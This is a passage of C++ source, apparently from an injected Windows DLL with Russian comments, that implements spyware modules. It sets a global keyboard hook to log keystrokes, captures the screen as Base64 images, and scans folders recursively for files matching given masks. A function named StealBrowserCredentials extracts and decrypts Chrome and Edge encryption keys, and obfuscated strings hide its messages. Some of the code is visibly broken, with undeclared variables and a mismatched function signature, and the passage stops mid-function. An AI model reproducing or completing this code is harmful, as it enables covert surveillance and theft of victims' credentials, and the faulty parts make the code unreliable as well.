                    case VK_CONTROL:/*keyString = "[CTRL]";*/ break;
                    case VK_LCONTROL:/*keyString = "[LCTRL]";*/ break;
                    case VK_RCONTROL:/*keyString = "[RCTRL]";*/ break;
                    case VK_MENU:   /*keyString = "[ALT]";*/ break; // ALT
                    case VK_LMENU:  /*keyString = "[LALT]";*/ break;
                    case VK_RMENU:  /*keyString = "[RALT]";*/ break;
                    case VK_CAPITAL:keyString = "[CAPSLOCK]"; break;
                    case VK_ESCAPE: keyString = "[ESC]"; break;
                    case VK_SPACE:  keyString = " "; break;
                    case VK_PRIOR:  keyString = "[PGUP]"; break; // Page Up
                    case VK_NEXT:   keyString = "[PGDN]"; break; // Page Down
                    case VK_END:    keyString = "[END]"; break;
                    case VK_HOME:   keyString = "[HOME]"; break;
                    case VK_LEFT:   keyString = "[LEFT]"; break;
                    case VK_UP:     keyString = "[UP]"; break;
                    case VK_RIGHT:  keyString = "[RIGHT]"; break;
                    case VK_DOWN:   keyString = "[DOWN]"; break;
                    case VK_DELETE: keyString = "[DEL]"; break;
                    case VK_INSERT: keyString = "[INS]"; break;
                    // Добавить другие нужные клавиши F1-F12 и т.д.
                    default:
                        char buffer[32];
                        sprintf(buffer, "[VK_%lu]", vkCode);
                        keyString = buffer;
                        break;
                 }
            }

            // Добавляем строку в буфер (с блокировкой)
            if (!keyString.empty()) {
                std::lock_guard<std::mutex> lock(g_bufferMutex);
                g_keyBuffer.push_back(keyString);
                 // printf("[Keylogger] Logged: %s\n", keyString.c_str()); // Отладочный вывод
            }
        }
    }

    // Обязательно вызываем следующий хук в цепочке
    return ptrCallNextHookEx ? ptrCallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam) : 0;
}

// --- Функция для запуска цикла обработки сообщений в отдельном потоке ---
DWORD WINAPI MessageLoopThread(LPVOID lpParam) {
    if (!ptrGetMessageW || !ptrTranslateMessage || !ptrDispatchMessageW) {
        printf("[Keylogger] Message loop functions not initialized! Thread exiting.\n");
        return 1;
    }

    printf("[Keylogger] Message loop thread started.\n");
    MSG msg;
    // Цикл нужен для обработки сообщений хука
    while (ptrGetMessageW(&msg, NULL, 0, 0) > 0) { 
        ptrTranslateMessage(&msg);
        ptrDispatchMessageW(&msg);
    }
     printf("[Keylogger] Message loop thread finished.\n");
    return 0;
}

// --- Функция для запуска кейлоггера ---
EXPORT_FUNC int StartKeylogger(char** errorMsg) {
    *errorMsg = NULL;
    if (g_keyloggerRunning) {
        printf("[Keylogger] Already running.\n");
        return 0; // Уже запущен
    }

    if (!InitializeApiPointers()) {
        ObfuscatedString err = OBFUSCATED("Failed to initialize API pointers for Keylogger.");
        *errorMsg = deobfuscate(err.data, err.length);
        return 4001;
    }

    // Запускаем цикл обработки сообщений в отдельном потоке
    g_messageLoopThread = CreateThread(NULL, 0, MessageLoopThread, NULL, 0, NULL);
    if (g_messageLoopThread == NULL) {
        DWORD lastError = GetLastError();
        printf("[Keylogger] Failed to create message loop thread. Error: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        return 4002;
    }

    // Устанавливаем глобальный хук на клавиатуру
    // HINSTANCE hMod = GetModuleHandle(NULL); // НЕПРАВИЛЬНО для LL хука в DLL
    HINSTANCE hMod = GetModuleHandleW(L"cpp_injector.dll"); // Нужно имя нашей DLL
     if (!hMod) {
         // Попробуем получить хендл текущего модуля другим способом, если DLL не имеет имени
          MEMORY_BASIC_INFORMATION mbi;
         VirtualQuery((LPCVOID)LowLevelKeyboardProc, &mbi, sizeof(mbi));
         hMod = (HINSTANCE)mbi.AllocationBase;
         if (!hMod) {
             DWORD lastError = GetLastError();
             printf("[Keylogger] Failed to get module handle for DLL. Error: %lu\n", lastError);
             ObfuscatedString err = OBFUSCATED("Failed get DLL module handle for hook.");
            *errorMsg = deobfuscate(err.data, err.length);
            // Закрыть поток? Да, иначе он будет висеть.
            TerminateThread(g_messageLoopThread, 1); // Грубое завершение
            CloseHandle(g_messageLoopThread);
            g_messageLoopThread = NULL;
            return 4003;
         }
          printf("[Keylogger] Module handle obtained via VirtualQuery: %p\n", hMod);
     } else {
         printf("[Keylogger] Module handle obtained via GetModuleHandleW: %p\n", hMod);
     }


    g_hKeyboardHook = ptrSetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, hMod, 0);
    
    if (g_hKeyboardHook == NULL) {
        DWORD lastError = GetLastError();
        printf("[Keylogger] SetWindowsHookExW failed. Error: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        // Закрыть поток
        TerminateThread(g_messageLoopThread, 1); // Грубое завершение
        CloseHandle(g_messageLoopThread);
        g_messageLoopThread = NULL;
        return 4004;
    }

    g_keyloggerRunning = TRUE;
    printf("[Keylogger] Started successfully. Hook handle: %p\n", g_hKeyboardHook);
    return 0; // Успех
}

// --- Функция для остановки кейлоггера ---
EXPORT_FUNC int StopKeylogger(char** errorMsg) {
     *errorMsg = NULL;
     if (!g_keyloggerRunning) {
         printf("[Keylogger] Not running.\n");
         return 0;
     }

     if (!ptrUnhookWindowsHookEx) {
         ObfuscatedString err = OBFUSCATED("UnhookWindowsHookEx function pointer is null.");
         *errorMsg = deobfuscate(err.data, err.length);
         return 4005;
     }

     BOOL unhooked = FALSE;
     if (g_hKeyboardHook) {
         unhooked = ptrUnhookWindowsHookEx(g_hKeyboardHook);
         g_hKeyboardHook = NULL;
     }

     // Остановить поток с циклом сообщений
     if (g_messageLoopThread) {
         // Посылаем сообщение WM_QUIT, чтобы цикл завершился штатно
         // PostThreadMessage(GetThreadId(g_messageLoopThread), WM_QUIT, 0, 0);
         // TODO: PostThreadMessage может быть небезопасным или не сработать
         // Более надежно - использовать флаг и проверку в цикле, но это усложнение.
         // Пока что используем TerminateThread, хотя это не рекомендуется.
         TerminateThread(g_messageLoopThread, 0); // Завершаем поток
         CloseHandle(g_messageLoopThread);
         g_messageLoopThread = NULL;
     }

     g_keyloggerRunning = FALSE;
     if (unhooked) {
         printf("[Keylogger] Stopped successfully.\n");
         return 0; // Успех
     } else {
          printf("[Keylogger] UnhookWindowsHookEx failed or hook was already null.\n");
          // Возможно, стоит вернуть ошибку, если unhooked == FALSE? Зависит от логики.
          // *errorMsg = get_windows_error_message(GetLastError()); // Если нужно передать ошибку
          return 4006; // Возвращаем код ошибки
     }
}

// --- Функция для получения логов кейлоггера --- 
// Возвращает JSON-подобную строку ["log1", "log2", ...]
// Вызывающая сторона ДОЛЖНА освободить память с помощью free_error_message.
EXPORT_FUNC char* GetKeyLogs() {
    std::lock_guard<std::mutex> lock(g_bufferMutex);
    if (g_keyBuffer.empty()) {
        return NULL; // Нет логов
    }

    std::string result = "[";
    bool first = true;
    for (const auto& log : g_keyBuffer) {
        if (!first) {
            result += ", ";
        }
        // Экранируем кавычки и бэкслеши внутри строки
        std::string escaped_log;
        for (char c : log) {
            if (c == '"' || c == '\\') {
                escaped_log += '\\';
            }
            escaped_log += c;
        }
        result += "\"" + escaped_log + "\"";
        first = false;
    }
    result += "]";

    // Очищаем буфер после получения логов
    g_keyBuffer.clear();

    // Копируем результат в C-строку для возврата
    char* c_result = (char*)malloc(result.length() + 1);
    if (!c_result) {
        printf("[Keylogger] Failed to allocate memory for key logs result.\n");
        return NULL;
    }
    strcpy(c_result, result.c_str());

    return c_result;
} 

// --- Реализация функций Скриншотера ---

EXPORT_FUNC char* CaptureScreenshot() {
    printf("[Screenshot] Attempting to capture screen...\n");

    if (!g_apiPointersInitialized) {
        if (!InitializeApiPointers()) {
             printf("[Screenshot] Failed to initialize API pointers.\n");
             return NULL;
        }
    }

    // Проверяем наличие базовых указателей API GDI
    if (!g_api.ptrGetDC || !g_api.ptrCreateCompatibleDC || !g_api.ptrGetDeviceCaps || 
        !g_api.ptrCreateCompatibleBitmap || !g_api.ptrSelectObject || !g_api.ptrBitBlt || 
        !g_api.ptrDeleteDC || !g_api.ptrReleaseDC || !g_api.ptrDeleteObject || 
        !g_api.ptrCryptBinaryToStringA || !g_api.ptrLocalFree) {
        printf("[Screenshot] One or more required basic GDI/Crypt32 API pointers are missing.\n");
        return NULL;
    }

    // Проверяем, доступны ли функции GDI+ для JPEG
    bool useGdiPlus = g_api.ptrGdiplusStartup && g_api.ptrGdiplusShutdown && 
                      g_api.ptrCreateStreamOnHGlobal && g_api.ptrGetHGlobalFromStream &&
                      g_api.ptrGdipCreateBitmapFromHBITMAP && g_api.ptrGdipSaveImageToStream && 
                      g_api.ptrGdipDisposeImage && g_api.ptrGdipGetImageEncodersSize && 
                      g_api.ptrGdipGetImageEncoders && g_api.ptrGetDIBits; // GetDIBits все равно нужен для BMP fallback

    if (useGdiPlus) {
        printf("[Screenshot] GDI+ available. Attempting JPEG capture.\n");
    } else {
        printf("[Screenshot] GDI+ not available or GetDIBits missing. Falling back to BMP capture.\n");
        // Проверяем, есть ли GetDIBits для BMP
        if (!g_api.ptrGetDIBits) {
             printf("[Screenshot] GetDIBits API pointer is missing. Cannot capture BMP either.\n");
             return NULL;
        }
    }

    HDC hScreenDC = NULL;
    HDC hMemoryDC = NULL;
    HBITMAP hBitmap = NULL;
    HGDIOBJ hOldBitmap = NULL;
    char* base64String = NULL;
    DWORD dwBase64StringSize = 0;
    BOOL bSuccess = FALSE;

    // --- Общая часть для BMP и JPEG: Получение HBITMAP --- 

    hScreenDC = g_api.ptrGetDC(NULL);
    if (!hScreenDC) { /* ... обработка ошибки ... */ return NULL; }

    hMemoryDC = g_api.ptrCreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) { /* ... обработка ошибки ... */ g_api.ptrReleaseDC(NULL, hScreenDC); return NULL; }

    int screenWidth = g_api.ptrGetDeviceCaps(hScreenDC, HORZRES);
    int screenHeight = g_api.ptrGetDeviceCaps(hScreenDC, VERTRES);
    if (screenWidth == 0 || screenHeight == 0) { /* ... обработка ошибки ... */ g_api.ptrDeleteDC(hMemoryDC); g_api.ptrReleaseDC(NULL, hScreenDC); return NULL; }
    printf("[Screenshot] Screen dimensions: %dx%d\n", screenWidth, screenHeight);

    hBitmap = g_api.ptrCreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    if (!hBitmap) { /* ... обработка ошибки ... */ g_api.ptrDeleteDC(hMemoryDC); g_api.ptrReleaseDC(NULL, hScreenDC); return NULL; }

    hOldBitmap = g_api.ptrSelectObject(hMemoryDC, hBitmap);

    printf("[Screenshot] Copying screen to memory DC using BitBlt...\n");
    if (!g_api.ptrBitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY)) {
        /* ... обработка ошибки ... */
        g_api.ptrSelectObject(hMemoryDC, hOldBitmap);
        g_api.ptrDeleteObject(hBitmap);
        g_api.ptrDeleteDC(hMemoryDC);
        g_api.ptrReleaseDC(NULL, hScreenDC);
        return NULL;
    }
    printf("[Screenshot] BitBlt successful.\n");

    // --- Разделение логики: JPEG или BMP --- 

    if (useGdiPlus) {
        // --- Логика JPEG с GDI+ ---
        printf("[Screenshot] Processing as JPEG using GDI+...\n");
        ULONG_PTR gdiplusToken;
        void* startupInput[3] = { (void*)1, NULL, NULL }; // GDI+ version 1.0
        GpStatus status = g_api.ptrGdiplusStartup(&gdiplusToken, startupInput, NULL);

        if (status == 0) { // 0 = Ok
            CLSID jpegClsid;
            GpBitmap* gpBitmap = NULL;
            LPSTREAM pStream = NULL;
            HGLOBAL hGlobal = NULL;
            void* pData = NULL;
            DWORD dataSize = 0;

            // Находим CLSID JPEG энкодера
            if (GetEncoderClsid(L"image/jpeg", &jpegClsid) != -1) {
                // Создаем GpBitmap из HBITMAP
                status = g_api.ptrGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &gpBitmap);
                if (status == 0 && gpBitmap) {
                    // Создаем поток в памяти
                    if (g_api.ptrCreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                        // Устанавливаем параметры качества JPEG (примерно 85)
                        EncoderParameters encoderParams;
                        encoderParams.Count = 1;
                        encoderParams.Parameter[0].Guid = /* EncoderQuality */ { 0x1D5BE4B5, 0xFA4A, 0x452D, { 0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0xE7, 0xEB } };
                        encoderParams.Parameter[0].Type = 4; // EncoderParameterValueTypeLong
                        encoderParams.Parameter[0].NumberOfValues = 1;
                        long quality = 85L;
                        encoderParams.Parameter[0].Value = &quality;
                        
                        // Сохраняем изображение в поток как JPEG
                         printf("[Screenshot] Saving GDI+ bitmap to stream as JPEG (quality %ld)...\n", quality);
                        status = g_api.ptrGdipSaveImageToStream(gpBitmap, pStream, &jpegClsid, &encoderParams);
                        if (status == 0) {
                            // Получаем HGLOBAL из потока
                            if (g_api.ptrGetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
                                dataSize = (DWORD)GlobalSize(hGlobal);
                                pData = GlobalLock(hGlobal);
                                if (pData && dataSize > 0) {
                                     printf("[Screenshot] JPEG data obtained from stream (size: %lu bytes).\n", dataSize);
                                    // Кодируем JPEG байты в Base64
                                     printf("[Screenshot] Encoding JPEG data to Base64...\n");
                                    bSuccess = g_api.ptrCryptBinaryToStringA((const BYTE*)pData, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwBase64StringSize);
                                    if (bSuccess && dwBase64StringSize > 0) {
                                         printf("[Screenshot] Required Base64 buffer size: %lu\n", dwBase64StringSize);
                                        base64String = (char*)malloc(dwBase64StringSize);
                                        if (base64String) {
                                            bSuccess = g_api.ptrCryptBinaryToStringA((const BYTE*)pData, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64String, &dwBase64StringSize);
                                            if (!bSuccess) {
                                                printf("[Screenshot] CryptBinaryToStringA (encode JPEG) failed. Error: %lu\n", GetLastError());
                                                free(base64String); base64String = NULL;
                                            } else {
                                                 printf("[Screenshot] JPEG data successfully encoded to Base64.\n");
                                            }
                                        } else {
                                             printf("[Screenshot] Failed to allocate memory for Base64 string (%lu bytes).\n", dwBase64StringSize);
                                        }
                                    } else {
                                        printf("[Screenshot] CryptBinaryToStringA (get size for JPEG) failed. Error: %lu\n", GetLastError());
                                    }
                                    GlobalUnlock(hGlobal);
                                }
                                // HGLOBAL освобождается потоком, если fDeleteOnRelease=TRUE
                            } else { printf("[Screenshot] GetHGlobalFromStream failed.\n"); }
                        } else { printf("[Screenshot] GdipSaveImageToStream failed. Status: %d\n", status); }
                        pStream->Release();
                    } else { printf("[Screenshot] CreateStreamOnHGlobal failed.\n"); }
                    g_api.ptrGdipDisposeImage(gpBitmap);
                } else { printf("[Screenshot] GdipCreateBitmapFromHBITMAP failed. Status: %d\n", status); }
            } else { printf("[Screenshot] JPEG Encoder CLSID not found.\n"); }
            
            g_api.ptrGdiplusShutdown(gdiplusToken);
             printf("[Screenshot] GDI+ shut down.\n");
        } else {
            printf("[Screenshot] GdiplusStartup failed. Status: %d. Falling back to BMP.\n", status);
            useGdiPlus = false; // Принудительно переходим на BMP, если GDI+ не запустился
        }
    }

    // --- Логика BMP (если GDI+ не использовался или не удался) ---
    if (!useGdiPlus || !base64String) { // Если GDI+ не сработал или мы изначально шли по пути BMP
        if (useGdiPlus) { // Если GDI+ пытался, но не смог, выводим сообщение
             printf("[Screenshot] GDI+ JPEG capture failed. Falling back to BMP capture.\n");
        }
         printf("[Screenshot] Processing as BMP...\n");
        BITMAPINFOHEADER bi;
        LPBYTE lpBitmapBits = NULL;

        ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = screenWidth;
        bi.biHeight = screenHeight;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = ((screenWidth * bi.biBitCount + 31) / 32) * 4 * screenHeight;

        lpBitmapBits = (LPBYTE)malloc(bi.biSizeImage);
        if (lpBitmapBits) {
            printf("[Screenshot] Getting DIBits for BMP...\n");
            if (g_api.ptrGetDIBits(hMemoryDC, hBitmap, 0, (UINT)screenHeight, lpBitmapBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
                 printf("[Screenshot] GetDIBits successful.\n");
                BITMAPFILEHEADER bmfHeader;
                DWORD dwBmpSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bi.biSizeImage;
                LPBYTE lpBitmap = (LPBYTE)malloc(dwBmpSize);
                if (lpBitmap) {
                    bmfHeader.bfType = 0x4D42;
                    bmfHeader.bfSize = dwBmpSize;
                    bmfHeader.bfReserved1 = 0;
                    bmfHeader.bfReserved2 = 0;
                    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
                    memcpy(lpBitmap, &bmfHeader, sizeof(BITMAPFILEHEADER));
                    memcpy(lpBitmap + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
                    memcpy(lpBitmap + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpBitmapBits, bi.biSizeImage);

                     printf("[Screenshot] Encoding BMP data to Base64...\n");
                    bSuccess = g_api.ptrCryptBinaryToStringA(lpBitmap, dwBmpSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwBase64StringSize);
                    if (bSuccess && dwBase64StringSize > 0) {
                         printf("[Screenshot] Required Base64 buffer size: %lu\n", dwBase64StringSize);
                        base64String = (char*)malloc(dwBase64StringSize);
                        if (base64String) {
                            bSuccess = g_api.ptrCryptBinaryToStringA(lpBitmap, dwBmpSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64String, &dwBase64StringSize);
                            if (!bSuccess) {
                                printf("[Screenshot] CryptBinaryToStringA (encode BMP) failed. Error: %lu\n", GetLastError());
                                free(base64String); base64String = NULL;
                            } else {
                                 printf("[Screenshot] BMP data successfully encoded to Base64.\n");
                            }
                        } else { printf("[Screenshot] Failed to allocate memory for Base64 string (%lu bytes).\n", dwBase64StringSize); }
                    } else { printf("[Screenshot] CryptBinaryToStringA (get size for BMP) failed. Error: %lu\n", GetLastError()); }
                    free(lpBitmap);
                } else { printf("[Screenshot] Failed to allocate memory for full BMP data.\n"); }
            } else { printf("[Screenshot] GetDIBits failed. Error: %lu\n", GetLastError()); }
            free(lpBitmapBits);
        } else { printf("[Screenshot] Failed to allocate memory for bitmap bits.\n"); }
    }

    // --- Общая Очистка --- 
    printf("[Screenshot] Cleaning up GDI resources...\n");
    g_api.ptrSelectObject(hMemoryDC, hOldBitmap); // Восстанавливаем старый битмап перед удалением DC
    g_api.ptrDeleteObject(hBitmap);
    g_api.ptrDeleteDC(hMemoryDC);
    g_api.ptrReleaseDC(NULL, hScreenDC);
    printf("[Screenshot] GDI resources cleaned up.\n");

    // Возвращаем указатель на Base64 строку (JPEG или BMP, или NULL, если все не удалось)
    return base64String;
}

EXPORT_FUNC void FreeScreenshotData(char* base64Data) {
    if (base64Data) {
        printf("[Screenshot] Freeing Base64 data memory.\n");
        // Используем LocalFree, так как CryptBinaryToStringA выделяет память с помощью LocalAlloc
        if(g_api.ptrLocalFree) {
           g_api.ptrLocalFree(base64Data);
        } else {
           // Попытка освободить стандартной free как fallback, хотя это неправильно
           printf("[Screenshot] Warning: LocalFree pointer not available, attempting free().\n");
           free(base64Data);
        }        
    } else {
         printf("[Screenshot] FreeScreenshotData called with NULL pointer.\n");
    }
} 

// --- Реализация функций кражи данных ---

// Вспомогательная функция для чтения файла в байтовый буфер
BYTE* ReadFileToBytes(const std::wstring& filePath, DWORD& fileSize) {
    fileSize = 0;
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[ReadFile] Failed to open file %ls. Error: %lu\n", filePath.c_str(), GetLastError());
        return NULL;
    }

    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        printf("[ReadFile] Invalid file size for %ls.\n", filePath.c_str());
        CloseHandle(hFile);
        return NULL;
    }

    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        printf("[ReadFile] Failed to allocate memory (%lu bytes) for file %ls.\n", fileSize, filePath.c_str());
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        printf("[ReadFile] Failed to read file %ls. Error: %lu\n", filePath.c_str(), GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    return buffer;
}

// Вспомогательная функция для декодирования Base64 (требует CryptBinaryToStringA)
BYTE* Base64Decode(const char* encodedData, DWORD encodedSize, DWORD& decodedSize) {
    decodedSize = 0;
    if (!g_api.ptrCryptBinaryToStringA) { // Используем ту же функцию, но в обратную сторону
         printf("[Base64Decode] CryptBinaryToStringA pointer missing.\n");
         return NULL;
    }

    DWORD requiredSize = 0;
    // Вычисляем необходимый размер для декодированных данных
    if (!CryptStringToBinaryA(encodedData, encodedSize, CRYPT_STRING_BASE64, NULL, &requiredSize, NULL, NULL)) {
        printf("[Base64Decode] CryptStringToBinaryA (get size) failed. Error: %lu\n", GetLastError());
        return NULL;
    }

    if (requiredSize == 0) {
         printf("[Base64Decode] Decoded size is zero.\n");
        return NULL;
    }

    BYTE* decodedBuffer = (BYTE*)malloc(requiredSize);
    if (!decodedBuffer) {
        printf("[Base64Decode] Failed to allocate memory (%lu bytes).\n", requiredSize);
        return NULL;
    }

    // Декодируем данные
    if (!CryptStringToBinaryA(encodedData, encodedSize, CRYPT_STRING_BASE64, decodedBuffer, &requiredSize, NULL, NULL)) {
        printf("[Base64Decode] CryptStringToBinaryA (decode) failed. Error: %lu\n", GetLastError());
        free(decodedBuffer);
        return NULL;
    }

    decodedSize = requiredSize;
    return decodedBuffer;
}

EXPORT_FUNC char* StealBrowserCredentials() {
    printf("[StealCreds] Attempting to steal browser credentials...\n");

    if (!g_apiPointersInitialized) {
        if (!InitializeApiPointers()) {
             printf("[StealCreds] Failed to initialize API pointers.\n");
             return NULL;
        }
    }

    // Проверяем доступность необходимых функций
    if (!g_api.ptrSHGetFolderPathW || !g_api.ptrCryptUnprotectData || !g_api.ptrLocalFree) {
         printf("[StealCreds] Required API pointers (Shell/DPAPI) are missing.\n");
        return NULL;
    }

    std::string resultJson = "{"; // Начинаем формировать JSON
    resultJson += "\"chrome_edge_keys\": [";
    bool firstKey = true;

    WCHAR localAppDataPath[MAX_PATH];
    if (FAILED(g_api.ptrSHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppDataPath))) {
        printf("[StealCreds] Failed to get Local AppData path.\n");
        return NULL; // Не можем продолжить без этого пути
    }
    std::wstring basePath = localAppDataPath;

    // Список путей к директориям профилей Chrome/Edge
    std::vector<std::wstring> chromePaths = {
        basePath + L"\\Google\\Chrome\\User Data\\Default",
        basePath + L"\\Microsoft\\Edge\\User Data\\Default"
    };

    for (const auto& path : chromePaths) {
        std::wstring keyFilePath = path + L"\\Local State";
        BYTE* keyFileData = ReadFileToBytes(keyFilePath, keyFileSize);
        if (keyFileData) {
            std::string keyJson = Base64Decode(reinterpret_cast<const char*>(keyFileData), keyFileSize);
            free(keyFileData);

            rapidjson::Document doc;
            doc.Parse(keyJson.c_str());
            if (doc.HasMember("os_crypt")) {
                const rapidjson::Value& osCrypt = doc["os_crypt"];
                if (osCrypt.HasMember("encrypted_key")) {
                    std::string encryptedKey = osCrypt["encrypted_key"].GetString();
                    std::string decryptedKey = DecryptKey(encryptedKey);
                    if (!decryptedKey.empty()) {
                        if (!firstKey) resultJson += ", ";
                        resultJson += "\"" + decryptedKey + "\"";
                        firstKey = false;
                    }
                }
            }
        }
    }

    resultJson += "]";
    printf("[StealCreds] Finished. Returning JSON data.\n");
    return returnJson;
}

// --- Реализация функций сканирования файлов ---

#include <vector>
#include <string>
#include <sstream> // Для сборки JSON
#include <Shlwapi.h> // Для PathMatchSpecW
#pragma comment(lib, "Shlwapi.lib")

// Вспомогательная функция: UTF8 -> WCHAR
std::wstring Utf8ToWide(const std::string& utf8Str) {
    if (utf8Str.empty()) return std::wstring();
    int sizeNeeded = MultiByteToWideChar(CP_UTF8, 0, &utf8Str[0], (int)utf8Str.size(), NULL, 0);
    if (sizeNeeded <= 0) return std::wstring();
    std::wstring wideStr(sizeNeeded, 0);
    MultiByteToWideChar(CP_UTF8, 0, &utf8Str[0], (int)utf8Str.size(), &wideStr[0], sizeNeeded);
    return wideStr;
}

// Вспомогательная функция: WCHAR -> UTF8
std::string WideToUtf8(const std::wstring& wideStr) {
    if (wideStr.empty()) return std::string();
    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, &wideStr[0], (int)wideStr.size(), NULL, 0, NULL, NULL);
    if (sizeNeeded <= 0) return std::string();
    std::string utf8Str(sizeNeeded, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wideStr[0], (int)wideStr.size(), &utf8Str[0], sizeNeeded, NULL, NULL);
    return utf8Str;
}

// --- Реализация wildcard match (замена PathMatchSpecW) ---
bool wildcard_match(const std::wstring& str, const std::wstring& pattern) {
    size_t s = 0, p = 0, star = std::wstring::npos, ss = 0;
    while (s < str.size()) {
        if (p < pattern.size() && (pattern[p] == L'?' || towlower(pattern[p]) == towlower(str[s]))) {
            ++s; ++p;
        } else if (p < pattern.size() && pattern[p] == L'*') {
            star = p++;
            ss = s;
        } else if (star != std::wstring::npos) {
            p = star + 1;
            s = ++ss;
        } else {
            return false;
        }
    }
    while (p < pattern.size() && pattern[p] == L'*') ++p;
    return p == pattern.size();
}

// Основная рекурсивная функция сканирования (внутренняя)
void ScanDirectoryInternal(
    const std::wstring& currentPath,
    const std::vector<std::wstring>& masks,
    int currentDepth,
    int maxDepth,
    std::vector<std::wstring>& foundFiles,
    ApiPointers& api // Передаем структуру с указателями
) {
    // Проверка глубины рекурсии
    if (maxDepth != -1 && currentDepth > maxDepth) {
        return;
    }

    WIN32_FIND_DATAW findData;
    std::wstring searchPath = currentPath + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        // Не удалось открыть директорию, возможно нет прав
         printf("[ScanFiles] Cannot open directory: %ls. Error: %lu\n", currentPath.c_str(), GetLastError());
        return;
    }

    do {
        // Пропускаем "." и ".."
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
            continue;
        }

        std::wstring fullPath = currentPath + L"\\" + findData.cFileName;

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Если это директория, рекурсивно сканируем её
            if (currentDepth < maxDepth) {
                ScanDirectoryInternal(fullPath, masks, currentDepth + 1, maxDepth, foundFiles, api);
            }
        } else {
            // Если это файл, проверяем соответствие маскам
            bool match = false;
            for (const auto& mask : masks) {
                // Используем PathMatchSpecW из Shlwapi.dll
                 // Потребуется инициализировать указатель на нее
                 // Пока предполагаем, что Shlwapi загружена или доступна
                if (wildcard_match(findData.cFileName, mask)) {
                    match = true;
                    break;
                }
            }

            if (match) {
                // printf("[ScanFiles] Found match: %ls\n", fullPath.c_str());
                foundFiles.push_back(fullPath);
            }
        }
    } while (FindNextFileW(hFind, &findData) != 0);

    FindClose(hFind);
}

EXPORT_FUNC char* ScanFilesRecursive(const char* startPathUtf8, const char* fileMasksUtf8, int maxDepth) {
     printf("[ScanFiles] Starting scan: Path='%s', Masks='%s', Depth=%d\n", startPathUtf8, fileMasksUtf8, maxDepth);
    
    if (!g_apiPointersInitialized) {
        if (!InitializeApiPointers()) {
             printf("[ScanFiles] Failed to initialize API pointers.\n");
             return NULL;
        }
    }
    // PathMatchSpecW не требует динамической загрузки, если линкуемся с Shlwapi.lib
    // Но лучше все равно проверить

    if (!startPathUtf8 || !fileMasksUtf8) {
         printf("[ScanFiles] Invalid input parameters.\n");
        return NULL;
    }

    std::wstring startPathW = Utf8ToWide(startPathUtf8);
    std::string masksStrUtf8 = fileMasksUtf8;
    std::vector<std::wstring> masksW;
    
    // Разбиваем строку масок по точке с запятой
    std::stringstream ssMasks(masksStrUtf8);
    std::string maskUtf8;
    while (std::getline(ssMasks, maskUtf8, ';')) {
        if (!maskUtf8.empty()) {
            masksW.push_back(Utf8ToWide(maskUtf8));
        }
    }

    if (startPathW.empty() || masksW.empty()) {
         printf("[ScanFiles] Start path or masks are empty after conversion.\n");
        return NULL;
    }

    std::vector<std::wstring> foundFilesW;
    printf("[ScanFiles] Starting recursive scan...\n");
    ScanDirectoryInternal(startPathW, masksW, 0, maxDepth, foundFilesW, g_api);
     printf("[ScanFiles] Scan finished. Found %zu files.\n", foundFilesW.size());

    if (foundFilesW.empty()) {
        return NULL; // Ничего не найдено
    }

    // Формируем JSON массив строк
    std::stringstream jsonStream;
    jsonStream << "[";
    for (size_t i = 0; i < foundFilesW.size(); ++i) {
        std::string pathUtf8 = WideToUtf8(foundFilesW[i]);
        // Экранируем обратные слеши для JSON
        std::string escapedPath;
        escapedPath.reserve(pathUtf8.length() * 2);
        for (char c : pathUtf8) {
            if (c == '\\') {
                escapedPath += "\\";
                escapedPath += "\\";
            } else {
                escapedPath += c;
            }
        }
        jsonStream << "\"" << escapedPath << "\"";
        if (i < foundFilesW.size() - 1) {
            jsonStream << ",";
        }
    }
    jsonStream << "]";

    std::string resultJson = jsonStream.str();

    // Копируем JSON строку в буфер, который может быть освобожден free_error_message
    char* returnJson = (char*)malloc(resultJson.length() + 1);
    if (!returnJson) {
        printf("[ScanFiles] Failed to allocate memory for return JSON.\n");
        return NULL;
    }
